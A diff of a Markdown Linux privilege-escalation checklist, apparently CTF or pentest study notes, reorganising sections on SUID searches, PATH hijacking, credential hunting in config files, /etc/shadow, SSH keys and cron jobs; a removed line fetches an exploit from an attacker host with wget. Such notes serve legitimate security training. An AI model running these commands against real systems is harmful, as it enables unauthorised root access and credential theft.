@@ -19,28 +19,22 @@
 - [ ] `ps aux` for running tasks
 - [ ] `/home/*` - check readable home dirs, `.bash_history`, SSH keys, stray notes
 - [ ] `/etc/passwd; /etc/shadow` - which users exist, their password hashes, writeable?
-- Try **unshadow** if using **JohnTheRipper**
 - [ ] `sudo -l` to see what I can execute as root (sudo) without a password
-- [ ] `find / -perm /4000 2> /dev/null`  to find SUID files
-- [ ] try to run `strings /path/to/binary` against an SUID or a SUDO(NOPASSWD) executable file and look for any binaries it runs without specifying the path
-- (you can add dir with a file with the same name to PATH `export PATH=/dir:$PATH` and execute code as this file)
-- [ ] App / web config files for hardcoded creds (`config.php`, `.env`, `wp-config.php`, etc.) - DB passwords are routinely reused for SSH and other services. A config file beats an exploit when it's there
-- [ ] Every credential you find → try it on every service and every user (password reuse)
 
-### Privilege escalation — vector hunting
+### Vector hunting & application
 
 - [ ] Kernel + OS version → search for a matching kernel exploit
 - [ ] Scheduled tasks: `crontab -l` / `systemctl list-timers` / `ps`; or run `pspy` and leave it a while
 - [ ] Enumerate credentials with `locate pass/pwd/passwd/password | more` or `grep -rnw '/' -ie "PASSWORD/PWD/PASSWD/PASS/..." --color=always 2> /dev/null | less`
 - [ ] Looks for SSH keys: `locate id_rsa | less`; `find / -name authorized_keys 2> /dev/null`; `find / -name id_rsa 2> /dev/null`
+- [ ] `find / -perm /4000 2> /dev/null`  to find SUID files
+- [ ] try to run `strings /path/to/binary` against an SUID or a SUDO(NOPASSWD) executable file and look for any binaries it runs without specifying the path
+-  (you can add dir with a file with the same name to PATH `export PATH=/dir:$PATH` and execute code as this file)
+- [ ] App / web config files for hardcoded creds (`config.php`, `.env`, `wp-config.php`, etc.) - DB passwords are routinely reused for SSH and other services. A config file beats an exploit when it's there
+- [ ] Every credential you find → try it on every service and every user (password reuse)
 - [ ] look through `PayloadsAllTheThings`
 - [ ] look through `GTFOBins`
 - [ ] Automated sweep: `LinPEAS` / `linux-exploit-suggester` / `LinEnum` / `linuxprivchecker`
-
-### Applying a vector
-
 - [ ] Try to apply known CVE's
-- Transfer the exploit: `python3 -m http.server 80` (attacker) → `wget <IP>/<file>` (target) → `chmod +x <file>`
 - [ ] Cronjob running as a higher privilege and writable? Drop your shell script in and wait
 - [ ] Landed root? `whoami` / `id` to confirm, then grab proof
-
